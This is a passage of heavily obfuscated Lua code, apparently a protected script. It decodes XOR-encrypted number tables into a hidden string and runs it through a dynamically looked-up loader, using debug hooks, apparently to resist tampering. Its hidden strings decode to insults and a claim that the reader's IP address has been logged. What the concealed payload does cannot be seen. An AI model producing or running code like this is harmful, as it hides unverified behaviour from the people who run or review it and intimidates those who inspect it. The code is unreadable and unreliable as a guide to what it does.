wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('3E') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('C5')] == mvbRd6P6kXhXKQ7TfYnCdEZ99NNFym4c0WkR1Hiwt9uo4ddPymDELLPv9cLnLmuTjaX9VR7L[wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('E1') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('3B') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('A6') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('87') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('95')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if mvbRd6P6kXhXKQ7TfYnCdEZ99NNFym4c0WkR1Hiwt9uo4ddPymDELLPv9cLnLmuTjaX9VR7L[wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('2D') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('B4') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('3E') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('C5')](t) then
                    mvbRd6P6kXhXKQ7TfYnCdEZ99NNFym4c0WkR1Hiwt9uo4ddPymDELLPv9cLnLmuTjaX9VR7L
                        [wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('2D') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('B4') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('3E') .. wYMieQqBFwMqyou4bvi2ixjzq6FgYiFPaio1Cq1ACMOhih7gqcjvbsNYA('C5')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; kUxj4q0ymAlLpf4TDu6OgVvabVyOiqxY0lIdN6KZkwMBAA2GD3mdP7wR3e72FVpn86(
{ 1026, 857, 964, 906, 849, 829, 1003, 779, 912, 1021, 836, 938, 709, 1208, 585, 577, 846, 586, 1099, 940, 642, 1136,
  552, 745, 976, 1034, 885, 758, 760, 1120, 698, 654, 546, 733, 727, 1111, 640, 1030, 618, 671, 665, 898, 753, 987, 845,
  1210, 744, 615, 1007, 867, 780, 1186, 655, 1209, 1035, 1189, 663, 1195, 1069, 878, 946, 1188, 1090, 862, 667, 784,
  1018, 933, 793, 623, 908, 787, 706, 810, 1157, 957, 597, 1028, 1182, 1101, 988, 754, 1110, 700, 1063, 775, 923, 965,
  1161, 637, 1062, 1079, 1169, 544, 617, 928, 781, 896, 1070, 1055, 767, 856, 716, 575, 678, 932, 1121, 901, 676, 959,
  600, 804, 796, 977, 883, 1048, 792, 743, 1065, 672, 609, 627, 916, 1156, 921, 838, 815, 719, 666, 729, 1200, 1085, 798,
  649, 750, 1038, 751, 951, 677, 1131, 937, 1084, 702, 740, 749, 1190, 1025, 558, 982, 889, 1020, 853, 599, 1153, 657,
  812, 761, 991, 948, 861, 1108, 620, 818, 871, 777, 863, 1051, 728, 1140, 770, 578, 859, 1081, 662, 1017, 797, 832,
  1150, 564, 825, 806, 1180, 587, 1045, 1072, 573, 1126, 963, 581, 854, 723, 1191, 731, 919, 1004, 684, 661, 768, 962,
  992, 747, 967, 707, 842, 1172, 831, 966, 826, 1097, 1012, 1076, 641, 1016, 1114, 924, 934, 1082, 759, 950, 868, 712,
  958, 851, 1163, 1087, 713, 1128, 791, 631, 1049, 1041, 1192, 914, 960, 651, 1032, 687, 1096, 820, 943, 882, 1037, 1075,
  703, 1116, 679, 961, 858, 1039, 839, 1125, 837, 1059, 559, 605, 1094, 879, 1185, 664, 1024, 776, 1178, 1199, 644, 1127,
  711, 978, 722, 732, 1088, 692, 904, 1029, 755, 1176, 682, 1102, 1086, 841, 998, 1061, 1010, 778, 1040, 1047, 852, 1105,
  821, 622, 892, 920, 1073, 1001, 1194, 1050, 624, 660, 953, 574, 877, 1092, 569, 625, 969, 788, 635, 670, 865, 949,
  1052, 619, 1181, 1212, 608, 545, 1054, 610, 1106, 568, 997, 650, 1014, 840, 814, 1184, 860, 556, 999, 823, 827, 1112,
  594, 993, 563, 1187, 589, 996, 790, 613, 936, 549, 1113, 1071, 900, 1027, 872, 1204, 689, 1155, 1107, 629, 873, 1043,
  843, 886, 646, 1196, 686, 813, 801, 974, 909, 606, 681, 694, 580, 626, 1158, 880, 1058, 1000, 636, 652, 1089, 1203,
  1122, 942, 922, 547, 762, 848, 565, 562, 785, 680, 926, 995, 721, 989, 817, 1202, 1064, 1093, 968, 708, 802, 656, 1170,
  1130, 752, 800, 701, 897, 1133, 833, 789, 1183, 748, 907, 1109, 984, 591, 824, 1103, 612, 739, 887, 954, 576, 994,
  1104, 718, 866, 929, 550, 1174, 765, 697, 766, 875, 555, 830, 1139, 742, 1036, 1044, 1091, 1095, 551, 1002, 941, 925,
  1134, 945, 980, 1137, 956, 985, 979, 911, 1164, 693, 734, 990, 763, 633, 764, 616, 639, 1117, 1066, 685, 757, 803, 972,
  1022, 864, 548, 1197, 756, 736, 1144, 691, 1146, 1179, 888, 1168, 593, 905, 567, 604, 1023, 1068, 566, 1123, 570, 643,
  1124, 1142, 690, 816, 795, 786, 621, 1031, 607, 726, 844, 1057, 1098, 602, 1056, 799, 808, 1083, 1008, 601, 869, 596,
  794, 683, 738, 1177, 588, 699, 1006, 715, 1033, 935, 1119, 807, 1206, 772, 1145, 714, 659, 571, 899, 1154, 668, 645,
  673, 874, 805, 870, 554, 947, 590, 1067, 737, 1162, 647, -1, 98, 123, 32, 84, 113, 29, 32, 117, 35, 57, 109, 116, 50,
  34, 28, 36, 16, 27, 204, 122, 21, 116, 119, 115, 16, 20, 38, 57, 20, 211, 31, 77, 23, 116, 38, 118, 144, 16, 11, 236,
  8, 163, 32, 36, 75, 26, 71, 126, 27, 189, 70, 89, 181, 61, 73, 209, 120, 74, 65, 24, 63, 65, 85, 10, 85, 85, 82, 17,
  172, 73, 10, 231, 89, 63, 85, 107, 27, 121, 88, 107, 52, 72, 28, 116, 106, 181, 65, 89, 75, 179, 24, 86, 16, 126, 92,
  203, 23, 32, 31, 25, 62, 95, 7, 119, 81, 19, 74, 61, 24, 117, 180, 62, 76, 86, 69, 171, 40, 98, 105, 101, 27, 10, 113,
  13, 21, 33, 90, 86, 74, 39, 100, 63, 21, 73, 35, 76, 88, 95, 23, 53, 19, 89, 28, 89, 36, 29, 3, 21, 73, 39, 72, 8, 96,
  210, 16, 28, 86, 35, 68, 65, 78, 247, 62, 92, 11, 73, 51, 36, 47, 14, 119, 7, 41, 7, 89, 108, 9, 129, 71, 25, 96, 59,
  218, 49, 117, 4, 114, 169, 110, 122, 88, 33, 171, 125, 28, 51, 28, 26, 23, 50, 3, 30, 9, 100, 107, 52, 48, 73, 20, 3,
  82, 24, 24, 92, 75, 26, 79, 58, 94, 115, 0, 121, 98, 65, 54, 116, 103, 70, 161, 116, 22, 7, 6, 30, 121, 41, 25, 73,
  122, 27, 154, 2, 89, 73, 29, 46, 50, 17, 28, 19, 82, 60, 71, 48, 85, 59, 117, 58, 21, 37, 15, 17, 70, 78, 76, 70, 45,
  10, 56, 95, 25, 84, 41, 108, 29, 14, 58, 12, 5, 227, 120, 110, 86, 75, 119, 118, 35, 60, 64, 30, 60, 119, 102, 54, 120,
  63, 105, 35, 63, 18, 115, 86, 56, 23, 168, 82, 15, 27, 113, 8, 4, 76, 159, 71, 37, 30, 98, 24, 20, 16, 65, 29, 91, 24,
  11, 84, 74, 113, 83, 0, 74, 70, 74, 193, 74, 31, 63, 73, 200, 77, 49, 68, 5, 82, 3, 84, 2, 167, 58, 81, 177, 237, 245,
  94, 91, 115, 84, 56, 94, 71, 126, 83, 98, 74, 50, 53, 71, 114, 26, 29, 179, 4, 129, 114, 35, 56, 23, 13, 16, 74, 48,
  10, 88, 90, 204, 123, 84, 146, 11, 18, 32, 83, 99, 85, 43, 64, 103, 68, 12, 65, 61, 106, 91, 60, 85, 115, 100, 98, 84,
  106, 70, 127, 239, 29, 75, 96, 42, 48, 21, 94, 107, 49, 21, 91, 65, 74, 52, 107, 193, 46, 229, 108, 89, 10, 70, 87, 81,
  116, 117, 114, 68, 27, 62, 99, 52, 46, 5, 88, 64, 112, 25, 24, 62, 73, 84, 10, 122, 31, 26, 3, 74, 83, 174, 81, 35, 16,
  162, 82, 55, 82, 44, 3, 192, 90, 125, 56, 186, 30, 18, 30, 74, 13, 0, 102, 24, 95, 20, 25, 76, 1, 78, 12, 116, 122, 17,
  39, 33, 19, 35, 55, 113, 68, 71, 134, 71, 83, 83, 123, 113, 2, 20, 93, 89, 84, 13, 107, 60, 195, 22, 13, 24, 1, 33, 46,
  80, 113, 91, 73, 17, 109, 113, 5, 38, 120, 4, 122, 74, 55, 75, 40, 98, 94, 19, 59, 82, 21, 70, 37, 25, 55, 49, 80, 86,
  106, 84, 70, 122, 2, 25, 27, 78, 73, 4, 56, 58, 78, 81, 7, 5, 122, 93, 125, 116, 96, 35, 237, 88, 16, 61, 16, 23, 115,
  93, 69, 71, 10, 210, 33, 70, 33, 13, 66, 37, 83, 75, 95, 22, 70, 121, 25, 51, 50, 93, 108, 202, 61, 187, 6, 183, 43,
  64, 114, 44, 94, 107, 5, 223, 99, 39, 87, 115, 50, 32, 221, 64, 117, 108, 84, 237, 96, 108, 70, 9, 52, 114, 28, 24, 84,
  10, 28, 6, 4, 2, 1, 108, 8, 91, 58, 65, 21, 103, 84, 45, 122, 68, 69, 58, 102, 198, 24, 98, 61, 178, 85, 13, 15, 0, 81,
  32, 64 }, "luT8iL8tUfB0ajQSrWZy95Lgix"); nVVHiweEssxU1oV18RqufUjUY5ZNmRt3jGafx4TUIf86RuY4F6Y =
mvbRd6P6kXhXKQ7TfYnCdEZ99NNFym4c0WkR1Hiwt9uo4ddPymDELLPv9cLnLmuTjaX9VR7L; lw7LiSGzb7muSzfvQYGn38R4ZQnqWduT4bmyNRzGSc6TXdJUtgcsqItrbGMF =
mvbRd6P6kXhXKQ7TfYnCdEZ99NNFym4c0WkR1Hiwt9uo4ddPymDELLPv9cLnLmuTjaX9VR7L; yZ6MFIDok1HrTbSvWRBUd3wk8vGV2GvBjf80BoTwmigmtd3YjVlzzwFfaYzevwro =
lw7LiSGzb7muSzfvQYGn38R4ZQnqWduT4bmyNRzGSc6TXdJUtgcsqItrbGMF; vmfClmPm6CwcYKdJutx6qfi34hFRNMUGKPKZ6sOryprSWIGkpILyj5P7Wn =
yZ6MFIDok1HrTbSvWRBUd3wk8vGV2GvBjf80BoTwmigmtd3YjVlzzwFfaYzevwro; bIxCmZyuGlubAsxfXCqDlO80cHa0dTdleUX99CytAKAOMSyyGHOjYTtJFMwRyL =
vmfClmPm6CwcYKdJutx6qfi34hFRNMUGKPKZ6sOryprSWIGkpILyj5P7Wn; gC6Yf36Nd0MOC6zDwjTKgL6oNsrzLUDIgpCIpLOMLnpVkSiYy2Pd47lM5CXk7j3kDc =
bIxCmZyuGlubAsxfXCqDlO80cHa0dTdleUX99CytAKAOMSyyGHOjYTtJFMwRyL; vOOB9UTfoMnImFTKAYAlcPDauFEVUPsS65zwZeQlE5Og8I7s2iIQpxKJWuEm4uj9XY461QL1Qf =
gC6Yf36Nd0MOC6zDwjTKgL6oNsrzLUDIgpCIpLOMLnpVkSiYy2Pd47lM5CXk7j3kDc; kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B = function(
  a)
  K, F = 1754712104418234, 16384 + 1208; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; gUshatCBvGAIrXKsSdRNIAnCCqawz1dUuD60FR4ymxgy7QFLsnzH2GrMPtjZTdlW = function(b)
  co = coroutine.create(b)
  xEBeyEpjWyVAEkUb8nj5wTBDLIIZm76Kzq5C1H594HofDqTkJV9yONEXz4Ow1k6WVs5 = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(xEBeyEpjWyVAEkUb8nj5wTBDLIIZm76Kzq5C1H594HofDqTkJV9yONEXz4Ow1k6WVs5, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return xEBeyEpjWyVAEkUb8nj5wTBDLIIZm76Kzq5C1H594HofDqTkJV9yONEXz4Ow1k6WVs5
end; dxTYI9CkiFBx6tsD7KrNPrk6JA0BHw2SMCxMYErxbK0GPZltasbqh3va8 = function(f, g)
  hGD49385pdYikwIpAVUrf1cFKqCGpoeO4qXOy8plyYmnl5Idws7H7VVcStpMSnSCEd12DewKPla = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; msijSDZ1WjoHzrsRFGEd9gOvi3GF9Kq7rQEtqjwBiDa8flCaQ3ITfTwt = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; wex4q4JhaXNSwhNgPsjid4tS02bvhvfUFFt3zcyctyph6vCJvsEEO5gGC = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      hGD49385pdYikwIpAVUrf1cFKqCGpoeO4qXOy8plyYmnl5Idws7H7VVcStpMSnSCEd12DewKPla(f[i], string.byte(g, j),
        function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; nA3u05HAsiyquLrpImu58DfpJlQvioBYlPGrdK4YGd5BGMp3b7gh6bFc2NxZtDcWldzZEAZ54 = function(p, n)
    xNcZOqx7y3lUl5CImN2OCFV6niO90oN1RUcS5rhiFNQj8ZoXH8oSKQI8OBpflR8DvlR = ""
    for k, q in pairs(p) do xNcZOqx7y3lUl5CImN2OCFV6niO90oN1RUcS5rhiFNQj8ZoXH8oSKQI8OBpflR8DvlR =
      xNcZOqx7y3lUl5CImN2OCFV6niO90oN1RUcS5rhiFNQj8ZoXH8oSKQI8OBpflR8DvlR ..
      vOOB9UTfoMnImFTKAYAlcPDauFEVUPsS65zwZeQlE5Og8I7s2iIQpxKJWuEm4uj9XY461QL1Qf
      [kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('BC') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('DB') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('9D') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('86') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('21') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('48')]
      [kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('CC') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('67') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('8E') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('9D')](
      q) end
    ; n(xNcZOqx7y3lUl5CImN2OCFV6niO90oN1RUcS5rhiFNQj8ZoXH8oSKQI8OBpflR8DvlR)
  end; msijSDZ1WjoHzrsRFGEd9gOvi3GF9Kq7rQEtqjwBiDa8flCaQ3ITfTwt(f,
    function(r) wex4q4JhaXNSwhNgPsjid4tS02bvhvfUFFt3zcyctyph6vCJvsEEO5gGC(r, g,
        function(s) nA3u05HAsiyquLrpImu58DfpJlQvioBYlPGrdK4YGd5BGMp3b7gh6bFc2NxZtDcWldzZEAZ54(s,
            function(t) if #gUshatCBvGAIrXKsSdRNIAnCCqawz1dUuD60FR4ymxgy7QFLsnzH2GrMPtjZTdlW(vOOB9UTfoMnImFTKAYAlcPDauFEVUPsS65zwZeQlE5Og8I7s2iIQpxKJWuEm4uj9XY461QL1Qf[kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('E3') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('40') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('8E') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('EB')]) == 1 then if vOOB9UTfoMnImFTKAYAlcPDauFEVUPsS65zwZeQlE5Og8I7s2iIQpxKJWuEm4uj9XY461QL1Qf[kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('E3') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('40') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('8E') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('EB')] == vOOB9UTfoMnImFTKAYAlcPDauFEVUPsS65zwZeQlE5Og8I7s2iIQpxKJWuEm4uj9XY461QL1Qf[kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('5F') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('9D') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('86') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('21') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('DB')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if vOOB9UTfoMnImFTKAYAlcPDauFEVUPsS65zwZeQlE5Og8I7s2iIQpxKJWuEm4uj9XY461QL1Qf[kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('E3') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('40') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('8E') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('EB')](t) then
                    vOOB9UTfoMnImFTKAYAlcPDauFEVUPsS65zwZeQlE5Og8I7s2iIQpxKJWuEm4uj9XY461QL1Qf
                        [kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('E3') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('40') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('8E') .. kCcFfo6G3OHIiV05yMlTvfKE9C0gmdYGoadsbhi7lTpW0gTdLBY63SweoLQKRkf885B('EB')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; dxTYI9CkiFBx6tsD7KrNPrk6JA0BHw2SMCxMYErxbK0GPZltasbqh3va8(
{ 632, 840, 1111, 1044, 1177, 1059, 562, 1040, 821, 1061, 754, 886, 965, 1052, 901, 1114, 893, 1057, 687, 570, 1143, 792,
  914, 1199, 902, 702, 1079, 677, 657, 952, 1102, 569, 642, 575, 1117, 1140, 910, 909, 1095, 1048, 802, 711, 673, 649,
  1042, 1186, 979, 592, 1076, 1207, 1116, 574, 988, 1069, 849, 1016, 777, 555, 1206, 944, 639, 615, 1009, 943, 1197,
  1155, 1053, 817, 985, 595, 853, 568, 1085, 1028, 1045, 681, 932, 900, 1115, 1182, 616, 596, 686, 1178, 928, 1015, 728,
  873, 654, 744, 872, 971, 1086, 798, 957, 876, 1006, 966, 1171, 859, 1093, 646, 814, 1008, 695, 799, 812, 693, 773, 753,
  828, 942, 547, 1036, 941, 975, 1185, 581, 665, 653, 1125, 946, 1021, 788, 1003, 656, 836, 749, 769, 949, 679, 826, 912,
  1032, 926, 794, 688, 722, 630, 1019, 1144, 896, 819, 613, 877, 937, 921, 927, 878, 874, 774, 746, 560, 938, 1163, 1105,
  854, 956, 1063, 947, 1148, 587, 948, 1039, 922, 735, 1043, 590, 1046, 623, 824, 806, 837, 813, 1137, 887, 699, 931,
  664, 552, 867, 1136, 1030, 1208, 644, 890, 1138, 782, 884, 915, 634, 1031, 745, 718, 759, 1024, 1084, 1202, 1027, 703,
  936, 994, 1169, 1190, 725, 1189, 1159, 1174, 973, 1209, 648, 843, 958, 707, 830, 577, 810, 1152, 717, 631, 594, 776,
  969, 1142, 1012, 626, 619, 586, 1113, 709, 797, 716, 767, 660, 838, 1062, 582, 1005, 546, 663, 1056, 1153, 765, 976,
  758, 629, 1170, 856, 1072, 1149, 756, 1118, 803, 751, 879, 1065, 741, 816, 842, 705, 610, 556, 1088, 953, 1210, 885,
  605, 1022, 607, 651, 871, 1132, 563, 787, 740, 1058, 1133, 1128, 923, 601, 960, 1106, 818, 712, 1068, 761, 991, 760,
  801, 627, 1198, 650, 645, 591, 795, 986, 785, 911, 1033, 772, 685, 598, 573, 721, 850, 1081, 641, 786, 907, 1191, 955,
  694, 832, 829, 1023, 1172, 588, 783, 809, 637, 674, 1129, 696, 640, 1066, 992, 1176, 1108, 742, 559, 723, 584, 734,
  919, 670, 918, 736, 779, 807, 558, 974, 553, 970, 1110, 550, 612, 771, 875, 978, 1167, 732, 708, 1007, 738, 1156, 1077,
  1083, 1011, 861, 883, 1162, 1179, 847, 583, 1051, 690, 635, 962, 980, 1173, 880, 804, 851, 1014, 551, 862, 548, 967,
  908, 691, 662, 680, 611, 924, 1195, 1001, 1187, 565, 811, 668, 894, 1119, 614, 848, 881, 1004, 913, 1161, 1181, 747,
  625, 950, 1120, 743, 1035, 593, 1000, 1154, 710, 968, 585, 579, 580, 684, 733, 1038, 982, 1212, 1082, 1103, 796, 1194,
  757, 763, 863, 701, 929, 1055, 636, 1017, 1146, 1002, 633, 1075, 790, 597, 789, 998, 1013, 1101, 1168, 704, 1184, 1166,
  996, 833, 698, 841, 549, 692, 905, 1192, 567, 671, 808, 1091, 620, 1205, 981, 697, 990, 1050, 1151, 784, 903, 676, 683,
  891, 916, 731, 713, 1090, 1010, 834, 1078, 775, 888, 669, 1112, 578, 678, 925, 865, 1211, 997, 727, 606, 945, 752,
